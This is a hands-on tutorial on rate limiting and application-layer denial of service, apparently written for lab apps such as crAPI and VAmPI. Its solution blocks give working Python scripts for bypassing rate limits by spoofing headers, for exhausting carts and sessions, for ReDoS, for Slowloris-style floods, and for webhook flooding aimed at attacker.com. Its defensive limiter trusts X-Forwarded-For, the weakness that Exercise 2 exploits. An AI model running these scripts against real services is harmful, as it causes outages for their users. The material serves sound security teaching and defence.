# 🚦 Rate Limiting & DoS Tutorial

**Difficulty**: ⭐⭐⭐ (Intermediate)  
**Time Required**: 1-2 hours  
**Applications**: crAPI, VAmPI, Custom rate-limited apps

## 📚 Table of Contents
1. [What is Rate Limiting?](#what-is-rate-limiting)
2. [Types of DoS Attacks](#types-of-dos-attacks)
3. [Rate Limiting Bypass Techniques](#rate-limiting-bypass-techniques)
4. [Hands-On Practice](#hands-on-practice)
5. [Defense Strategies](#defense-strategies)
6. [Additional Resources](#additional-resources)

---

## 🎯 Learning Objectives

By the end of this tutorial, you will:
- ✅ Understand rate limiting mechanisms
- ✅ Identify rate limiting weaknesses
- ✅ Bypass common rate limiting implementations
- ✅ Perform application-layer DoS attacks
- ✅ Implement effective rate limiting

---

## What is Rate Limiting?

Rate limiting controls the number of requests a user can make to an API or application within a specific time window. It's crucial for preventing abuse, brute force attacks, and denial of service.

### 🎬 Real-World Impact

Rate limiting failures have led to:
- **Instagram (2019)**: Account takeover via brute force
- **Snapchat (2014)**: 4.6M usernames/phones leaked via API abuse
- **Twitter (2022)**: API abuse leading to data scraping
- **GitHub (2021)**: DoS via GraphQL complexity attacks

### 🔍 Common Rate Limiting Methods

1. **Fixed Window**: X requests per time period
2. **Sliding Window**: Rolling time window
3. **Token Bucket**: Tokens consumed per request
4. **Leaky Bucket**: Queue with fixed processing rate
5. **Distributed Rate Limiting**: Across multiple servers

---

## Types of DoS Attacks

### Application Layer DoS

1. **Resource Exhaustion**
   - CPU-intensive operations
   - Memory consumption
   - Database queries

2. **Business Logic Abuse**
   - Cart abandonment
   - Inventory locking
   - Session flooding

3. **Asymmetric Attacks**
   - Small request → Large response
   - Regex DoS (ReDoS)
   - Algorithmic complexity

### API-Specific DoS

1. **Endpoint Flooding**
2. **Parameter Pollution**
3. **Batch Operation Abuse**
4. **Webhook Flooding**

---

## Rate Limiting Bypass Techniques

### Common Bypass Methods

1. **IP Rotation**
   - Multiple source IPs
   - IPv6 address space
   - Cloud/proxy services

2. **Header Manipulation**
   - X-Forwarded-For
   - X-Real-IP
   - X-Originating-IP

3. **Endpoint Variation**
   - Case sensitivity
   - Path normalization
   - Parameter shuffling

4. **Distributed Attacks**
   - Multiple accounts
   - Concurrent requests
   - Race conditions

---

## Hands-On Practice

### 🏃 Exercise 1: Basic Rate Limit Detection

**Setup**: API with unknown rate limiting  
**Goal**: Identify rate limit threshold and reset window

<details>
<summary>💡 Hint 1: Systematic testing</summary>

Start with a baseline:
1. Send requests slowly (1/second)
2. Gradually increase rate
3. Note when you get rate limited

Look for response codes like 429 or specific error messages.

</details>

<details>
<summary>💡 Hint 2: Response headers</summary>

Check for rate limit headers:
- `X-RateLimit-Limit`
- `X-RateLimit-Remaining`
- `X-RateLimit-Reset`
- `Retry-After`

These reveal the implementation!

</details>

<details>
<summary>💡 Hint 3: Reset window testing</summary>

Once rate limited:
1. Note the exact time
2. Try requests at intervals
3. Find when limit resets

Is it fixed window or sliding?

</details>

<details>
<summary>🔓 Solution</summary>

**Detection Script**:
```python
import time
import requests
from datetime import datetime

def detect_rate_limit(url):
    count = 0
    start_time = time.time()
    
    while True:
        response = requests.get(url)
        count += 1
        
        # Check for rate limiting
        if response.status_code == 429:
            print(f"Rate limited after {count} requests")
            print(f"Time taken: {time.time() - start_time:.2f}s")
            
            # Check headers
            print("\nRate limit headers:")
            for header, value in response.headers.items():
                if 'rate' in header.lower() or header.lower() == 'retry-after':
                    print(f"{header}: {value}")
            
            # Test reset window
            print("\nTesting reset window...")
            return test_reset_window(url)
        
        # Also check for soft rate limiting
        if response.elapsed.total_seconds() > 1:
            print(f"Possible soft rate limit at {count} requests")
        
        time.sleep(0.1)  # 10 requests/second

def test_reset_window(url):
    windows = []
    
    for wait_time in [1, 5, 10, 30, 60]:
        time.sleep(wait_time)
        response = requests.get(url)
        
        if response.status_code != 429:
            windows.append(wait_time)
            print(f"Rate limit reset after {wait_time} seconds")
            break
    
    return windows

# Advanced detection
def advanced_detection(base_url):
    results = {}
    
    # Test different endpoints
    endpoints = ['/api/users', '/api/login', '/api/search']
    for endpoint in endpoints:
        print(f"\nTesting {endpoint}")
        results[endpoint] = detect_rate_limit(base_url + endpoint)
    
    # Test different methods
    for method in ['GET', 'POST', 'PUT']:
        print(f"\nTesting {method} method")
        response = requests.request(method, base_url + '/api/test')
    
    return results
```

**Findings Interpretation**:
- **100 requests/minute**: Standard API limit
- **10 requests/minute**: Sensitive endpoints (login, password reset)
- **Reset at minute boundary**: Fixed window
- **Reset after 60s from first request**: Sliding window

</details>

---

### 🏃 Exercise 2: IP-Based Rate Limit Bypass

**Setup**: Rate limiting based on IP address  
**Goal**: Bypass using header manipulation

<details>
<summary>💡 Hint 1: Common headers</summary>

Try adding these headers:
- `X-Forwarded-For: 1.2.3.4`
- `X-Real-IP: 1.2.3.4`
- `X-Originating-IP: 1.2.3.4`
- `Client-IP: 1.2.3.4`

Which ones affect the rate limiting?

</details>

<details>
<summary>💡 Hint 2: Header chaining</summary>

Some implementations check the first IP in a chain:
```
X-Forwarded-For: 1.2.3.4, 5.6.7.8, 9.10.11.12
```

Try different positions and formats!

</details>

<details>
<summary>💡 Hint 3: IPv6 and spoofing</summary>

If IPv6 is supported:
- Each /64 subnet = billions of IPs
- Try `X-Forwarded-For: 2001:db8::1`

Also try localhost bypasses: `127.0.0.1`, `::1`

</details>

<details>
<summary>🔓 Solution</summary>

**Method 1: Header rotation**
```python
import requests
import random

def bypass_with_headers(url, num_requests):
    headers_to_try = [
        'X-Forwarded-For',
        'X-Real-IP',
        'X-Originating-IP',
        'Client-IP',
        'X-Client-IP',
        'X-Forwarded',
        'Forwarded-For',
        'True-Client-IP',
        'CF-Connecting-IP'  # Cloudflare
    ]
    
    for i in range(num_requests):
        # Generate random IP
        ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        # Try each header
        for header in headers_to_try:
            headers = {header: ip}
            response = requests.get(url, headers=headers)
            
            if response.status_code != 429:
                print(f"Success with {header}: {ip}")
                break

# Method 2: IPv6 rotation
def ipv6_bypass(url, num_requests):
    base_prefix = "2001:db8::"
    
    for i in range(num_requests):
        # Generate random IPv6 in subnet
        ip = f"{base_prefix}{random.randint(1,65535):x}:{random.randint(1,65535):x}"
        headers = {'X-Forwarded-For': ip}
        
        response = requests.get(url, headers=headers)
        print(f"Request {i+1}: {response.status_code}")

# Method 3: Header value manipulation
def header_manipulation_bypass(url):
    manipulations = [
        "127.0.0.1",  # Localhost
        "0.0.0.0",    # Any
        "192.168.1.1", # Private IP
        "10.0.0.1",    # Private IP
        "169.254.169.254",  # AWS metadata
        "localhost",   # Hostname
        "127.0.0.1, 1.2.3.4",  # Chain
        "1.2.3.4, 127.0.0.1",  # Reverse chain
        " 1.2.3.4",    # Space prefix
        "1.2.3.4 ",    # Space suffix
        "01.02.03.04", # Octal
        "0x01020304",  # Hex
        "16843009",    # Decimal (1.2.3.4)
    ]
    
    for value in manipulations:
        headers = {'X-Forwarded-For': value}
        response = requests.get(url, headers=headers)
        
        if response.status_code != 429:
            print(f"Bypass successful with: {value}")
```

**Method 4: Race condition exploit**
```python
import threading
import requests

def race_condition_bypass(url, num_threads=10):
    results = []
    
    def make_request():
        response = requests.get(url)
        results.append(response.status_code)
    
    # Launch simultaneous requests
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=make_request)
        threads.append(t)
        t.start()
    
    # Wait for completion
    for t in threads:
        t.join()
    
    # Count successful requests
    success_count = results.count(200)
    print(f"Successful requests: {success_count}/{num_threads}")
```

</details>

---

### 🏃 Exercise 3: Business Logic DoS

**Setup**: E-commerce application with cart functionality  
**Goal**: Create DoS through resource exhaustion

<details>
<summary>💡 Hint 1: Identify expensive operations</summary>

Look for operations that:
- Create database records
- Reserve inventory
- Generate PDFs/reports
- Send emails/SMS
- Process payments

These consume more resources!

</details>

<details>
<summary>💡 Hint 2: Cart manipulation</summary>

Try:
1. Add many items to cart
2. Create multiple carts
3. Abandon carts repeatedly

Does this lock inventory or create sessions?

</details>

<details>
<summary>💡 Hint 3: Asymmetric operations</summary>

Find operations where:
- Small request → Large response
- Simple input → Complex processing
- One request → Multiple backend calls

</details>

<details>
<summary>🔓 Solution</summary>

**Method 1: Cart explosion**
```python
def cart_dos_attack(base_url, session):
    # Create many abandoned carts
    for i in range(1000):
        # Create new session
        s = requests.Session()
        
        # Add expensive items
        for item_id in range(1, 100):
            s.post(f"{base_url}/api/cart/add", json={
                "item_id": item_id,
                "quantity": 999
            })
        
        # Don't checkout - leave cart active
        print(f"Created cart {i+1}")

# Method 2: Search complexity attack
def search_dos(base_url):
    # Regex DoS patterns
    evil_patterns = [
        "(a+)+",          # Exponential backtracking
        "(a*)*b",         # Catastrophic backtracking
        "(x+x+)+y",       # Polynomial time
        ".*.*.*.*.*.*.*", # Multiple wildcards
    ]
    
    for pattern in evil_patterns:
        response = requests.get(f"{base_url}/api/search", 
                              params={"q": pattern})
        print(f"Pattern '{pattern}': {response.elapsed.total_seconds()}s")

# Method 3: Report generation abuse
def report_dos(base_url, auth_token):
    headers = {"Authorization": f"Bearer {auth_token}"}
    
    # Request large date ranges
    for year in range(2000, 2024):
        requests.post(f"{base_url}/api/reports/generate", 
                     headers=headers,
                     json={
                         "type": "detailed_transactions",
                         "start_date": f"{year}-01-01",
                         "end_date": f"{year}-12-31",
                         "format": "pdf",
                         "include_graphs": True
                     })
```

**Method 4: Webhook flooding**
```python
def webhook_dos(base_url):
    # Register many webhooks
    for i in range(1000):
        requests.post(f"{base_url}/api/webhooks", json={
            "url": f"http://attacker.com/hook{i}",
            "events": ["*"],  # All events
            "active": True
        })
    
    # Trigger events that call all webhooks
    requests.post(f"{base_url}/api/users", json={
        "username": "trigger_webhooks"
    })
```

**Method 5: Session exhaustion**
```python
import concurrent.futures

def session_exhaustion(base_url):
    def create_session():
        s = requests.Session()
        # Login to create authenticated session
        s.post(f"{base_url}/login", data={
            "username": f"user{random.randint(1,1000)}",
            "password": "password"
        })
        # Keep session alive
        while True:
            s.get(f"{base_url}/api/profile")
            time.sleep(30)
    
    # Create many concurrent sessions
    with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
        futures = [executor.submit(create_session) for _ in range(1000)]
```

</details>

---

### 🏃 Exercise 4: Distributed Rate Limit Bypass

**Setup**: API with distributed rate limiting  
**Goal**: Exploit coordination weaknesses

<details>
<summary>💡 Hint 1: Identify the architecture</summary>

Test if rate limiting is:
- Per-server (load balancer rotation)
- Eventually consistent (sync delays)
- Cache-based (TTL exploitation)

Send rapid requests and check for inconsistencies.

</details>

<details>
<summary>💡 Hint 2: Timing attacks</summary>

If there's a sync delay:
1. Hit limit on server A
2. Quickly switch to server B
3. Exploit the sync window

Try different timings!

</details>

<details>
<summary>💡 Hint 3: Cache poisoning</summary>

Some implementations cache rate limit data. Try:
- Malformed user IDs
- Unicode characters
- Null bytes
- Very long identifiers

Can you poison the cache?

</details>

<details>
<summary>🔓 Solution</summary>

**Method 1: Load balancer rotation**
```python
def distributed_bypass(base_url):
    # Force different backend servers
    techniques = [
        # Different IPs
        lambda: requests.get(base_url, headers={'X-Forwarded-For': f'1.2.3.{random.randint(1,255)}'}),
        
        # Different sessions
        lambda: requests.get(base_url, cookies={'session': str(uuid.uuid4())}),
        
        # Different user agents
        lambda: requests.get(base_url, headers={'User-Agent': f'Bot{random.randint(1,1000)}'}),
        
        # Connection closing
        lambda: requests.get(base_url, headers={'Connection': 'close'})
    ]
    
    for technique in techniques:
        successes = 0
        for _ in range(100):
            if technique().status_code == 200:
                successes += 1
        print(f"Technique success rate: {successes}%")

# Method 2: Race condition on distributed limit
def distributed_race(base_url, num_workers=50):
    import multiprocessing
    
    def hammer(worker_id):
        session = requests.Session()
        results = []
        
        for i in range(100):
            response = session.get(base_url)
            results.append(response.status_code)
            
        return results.count(200)
    
    # Launch from multiple processes
    with multiprocessing.Pool(num_workers) as pool:
        results = pool.map(hammer, range(num_workers))
        
    total_success = sum(results)
    print(f"Total successful requests: {total_success}")

# Method 3: Sync window exploitation
def sync_window_exploit(base_url):
    # Hit rate limit
    session1 = requests.Session()
    while session1.get(base_url).status_code == 200:
        pass
    
    print("Rate limit hit, exploiting sync window...")
    
    # Immediately use different identifier
    exploited = 0
    for i in range(100):
        # Each request uses different session
        response = requests.get(base_url, 
                               headers={'X-Session-ID': str(i)})
        if response.status_code == 200:
            exploited += 1
    
    print(f"Exploited {exploited} requests during sync")

# Method 4: Cache key collision
def cache_collision_attack(base_url):
    # Try to create cache collisions
    identifiers = [
        "user123",           # Normal
        "user123\x00admin", # Null byte injection
        "user123%00admin",  # URL encoded null
        "user¹²³",          # Unicode
        "USER123",          # Case variation
        " user123",         # Whitespace
        "user123 ",
        "user123\n",        # Newline
        "user123\r\n",      # CRLF
        "user123/../admin", # Path traversal
    ]
    
    for identifier in identifiers:
        headers = {'X-User-ID': identifier}
        response = requests.get(base_url, headers=headers)
        
        if response.status_code == 200:
            # Test if we bypassed limits
            for _ in range(100):
                if requests.get(base_url, headers=headers).status_code != 200:
                    break
            else:
                print(f"Cache bypass with: {repr(identifier)}")
```

</details>

---

### 🏃 Challenge: Advanced DoS Techniques

**Goal**: Combine multiple techniques for maximum impact

<details>
<summary>🎯 Challenge Overview</summary>

Advanced DoS scenarios:
1. Amplification attacks
2. Resource chain attacks
3. Slowloris-style attacks
4. Business logic chains

</details>

<details>
<summary>💡 Hint: Amplification</summary>

Find operations where:
- 1 request triggers N operations
- Small input generates large output
- Recursive operations exist

Chain these for amplification!

</details>

<details>
<summary>🔓 Solution</summary>

**Amplification Attack Chain**:
```python
# Step 1: Find amplification endpoints
def find_amplifiers(base_url):
    amplifiers = []
    
    # Test notification endpoints
    response = requests.post(f"{base_url}/api/notify/all", json={
        "message": "test"
    })
    if response.status_code == 200:
        amplifiers.append(('notify_all', response.json().get('recipients', 0)))
    
    # Test batch operations
    response = requests.post(f"{base_url}/api/batch", json={
        "operations": [{"action": "create_user"} for _ in range(100)]
    })
    if response.status_code == 200:
        amplifiers.append(('batch_ops', 100))
    
    return amplifiers

# Step 2: Slowloris-style attack
def application_slowloris(base_url):
    import socket
    
    def slow_request():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('target.com', 80))
        
        # Send headers slowly
        s.send(b"POST /api/upload HTTP/1.1\r\n")
        s.send(b"Host: target.com\r\n")
        s.send(b"Content-Type: multipart/form-data\r\n")
        s.send(b"Content-Length: 1000000\r\n")
        
        # Send body very slowly
        while True:
            s.send(b"A" * 10)
            time.sleep(10)  # 10 bytes every 10 seconds
    
    # Open many slow connections
    threads = []
    for _ in range(1000):
        t = threading.Thread(target=slow_request)
        t.start()
        threads.append(t)

# Step 3: Resource chain attack
def resource_chain_dos(base_url, auth_token):
    headers = {"Authorization": f"Bearer {auth_token}"}
    
    # Create chain: Upload → Process → Generate → Email
    
    # 1. Upload large file
    files = {'file': ('large.csv', 'A' * 10000000)}
    response = requests.post(f"{base_url}/api/upload", 
                           files=files, headers=headers)
    file_id = response.json()['id']
    
    # 2. Trigger processing (CPU intensive)
    requests.post(f"{base_url}/api/process/{file_id}", 
                 json={"algorithm": "complex_analysis"}, 
                 headers=headers)
    
    # 3. Generate reports (Memory intensive)
    requests.post(f"{base_url}/api/report/generate", 
                 json={
                     "file_id": file_id,
                     "include_visualizations": True,
                     "format": "pdf"
                 }, headers=headers)
    
    # 4. Email to many recipients (I/O intensive)
    requests.post(f"{base_url}/api/email/blast", 
                 json={
                     "file_id": file_id,
                     "recipients": ["user@example.com"] * 1000
                 }, headers=headers)

# Step 4: Algorithmic complexity attack
def algorithmic_dos(base_url):
    # Exploit O(n²) or worse algorithms
    
    # Sort endpoint with worst-case input
    worst_case_array = list(range(10000, 0, -1))  # Reverse sorted
    requests.post(f"{base_url}/api/sort", 
                 json={"data": worst_case_array})
    
    # Graph traversal with dense graph
    dense_graph = {
        str(i): [str(j) for j in range(1000) if i != j]
        for i in range(100)
    }
    requests.post(f"{base_url}/api/pathfind", 
                 json={"graph": dense_graph, "start": "0", "end": "99"})
```

</details>

---

## Defense Strategies

### 🛡️ Implementing Robust Rate Limiting

**1. Multi-Layer Rate Limiting**
```python
from functools import wraps
import redis
import time

redis_client = redis.Redis()

def rate_limit(max_requests=100, window=60, by='ip'):
    def decorator(f):
        @wraps(f)
        def wrapped(request, *args, **kwargs):
            # Identify client
            if by == 'ip':
                identifier = request.headers.get('X-Forwarded-For', request.remote_addr)
            elif by == 'user':
                identifier = request.user.id if request.user else 'anonymous'
            elif by == 'api_key':
                identifier = request.headers.get('X-API-Key', 'none')
            
            # Create multiple rate limit keys
            keys = [
                f"rate_limit:{identifier}:minute",
                f"rate_limit:{identifier}:hour",
                f"rate_limit:{identifier}:day"
            ]
            
            limits = [
                (10, 60),      # 10 per minute
                (100, 3600),   # 100 per hour  
                (1000, 86400)  # 1000 per day
            ]
            
            for key, (limit, window) in zip(keys, limits):
                current = redis_client.incr(key)
                if current == 1:
                    redis_client.expire(key, window)
                
                if current > limit:
                    return {'error': 'Rate limit exceeded'}, 429
            
            return f(request, *args, **kwargs)
        return wrapped
    return decorator
```

**2. Sliding Window Implementation**
```python
def sliding_window_limit(identifier, max_requests, window_seconds):
    now = time.time()
    window_start = now - window_seconds
    
    # Remove old entries
    redis_client.zremrangebyscore(f"sliding:{identifier}", 0, window_start)
    
    # Count requests in window
    current_requests = redis_client.zcard(f"sliding:{identifier}")
    
    if current_requests >= max_requests:
        return False
    
    # Add current request
    redis_client.zadd(f"sliding:{identifier}", {str(now): now})
    redis_client.expire(f"sliding:{identifier}", window_seconds)
    
    return True
```

**3. Distributed Rate Limiting**
```python
class DistributedRateLimiter:
    def __init__(self, redis_cluster):
        self.redis = redis_cluster
    
    def check_limit(self, identifier, limit, window):
        # Use Lua script for atomic operation
        lua_script = """
        local key = KEYS[1]
        local limit = tonumber(ARGV[1])
        local window = tonumber(ARGV[2])
        local now = tonumber(ARGV[3])
        
        -- Remove old entries
        redis.call('ZREMRANGEBYSCORE', key, 0, now - window)
        
        -- Count current
        local current = redis.call('ZCARD', key)
        
        if current >= limit then
            return 0
        end
        
        -- Add new entry
        redis.call('ZADD', key, now, now)
        redis.call('EXPIRE', key, window)
        
        return limit - current
        """
        
        remaining = self.redis.eval(
            lua_script, 
            1, 
            f"drl:{identifier}",
            limit, 
            window, 
            time.time()
        )
        
        return remaining > 0
```

### 🛡️ DoS Protection Strategies

1. **Request Validation**
```python
def validate_request_size(max_size=1048576):  # 1MB
    def decorator(f):
        @wraps(f)
        def wrapped(request, *args, **kwargs):
            if request.content_length > max_size:
                return {'error': 'Request too large'}, 413
            return f(request, *args, **kwargs)
        return wrapped
    return decorator
```

2. **Compute Budget**
```python
class ComputeBudget:
    def __init__(self, max_cpu_seconds=5):
        self.max_cpu = max_cpu_seconds
    
    def execute_with_timeout(self, func, *args, **kwargs):
        import signal
        
        def timeout_handler(signum, frame):
            raise TimeoutError("Operation timed out")
        
        signal.signal(signal.SIGALRM, timeout_handler)
        signal.alarm(self.max_cpu)
        
        try:
            result = func(*args, **kwargs)
        finally:
            signal.alarm(0)
        
        return result
```

3. **Resource Pooling**
```python
from concurrent.futures import ThreadPoolExecutor
import queue

class ResourcePool:
    def __init__(self, max_workers=10, queue_size=100):
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
        self.queue = queue.Queue(maxsize=queue_size)
    
    def submit_task(self, func, *args, **kwargs):
        try:
            future = self.executor.submit(func, *args, **kwargs)
            self.queue.put(future, timeout=1)
            return future
        except queue.Full:
            raise Exception("Server too busy")
```

---

## 📊 Rate Limiting Checklist

### Implementation
- [ ] Multiple rate limit tiers
- [ ] Sliding window algorithm
- [ ] Distributed coordination
- [ ] Graceful degradation
- [ ] Clear error messages

### Monitoring
- [ ] Track limit violations
- [ ] Monitor resource usage
- [ ] Alert on anomalies
- [ ] Log suspicious patterns
- [ ] Dashboard visibility

### Testing
- [ ] Load testing
- [ ] Bypass attempt detection
- [ ] Performance impact
- [ ] Edge case handling
- [ ] Recovery testing

---

## 🏆 Skill Check

Before moving on, make sure you can:

- [ ] Identify rate limiting mechanisms
- [ ] Bypass weak implementations
- [ ] Perform application DoS attacks
- [ ] Implement secure rate limiting
- [ ] Monitor and respond to attacks

---

## Additional Resources

### 🔧 Tools
- **Vegeta**: HTTP load testing tool
- **Locust**: Distributed load testing
- **slowloris.py**: Slow HTTP DoS tool
- **GoldenEye**: Layer 7 DoS tool

### 📖 Further Reading
- [OWASP DoS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)
- [Rate Limiting Strategies](https://cloud.google.com/architecture/rate-limiting-strategies-techniques)
- [API Security Best Practices](https://owasp.org/www-project-api-security/)

### 🎥 Video Resources
- [DefCon - Advanced Rate Limit Bypass](https://www.youtube.com/watch?v=mwOV1VqG3eQ)
- [API Security Course](https://www.youtube.com/watch?v=uts0xJOqjME)

---

**Next Tutorial**: [Docker Container Escape](docker-escape.md) → 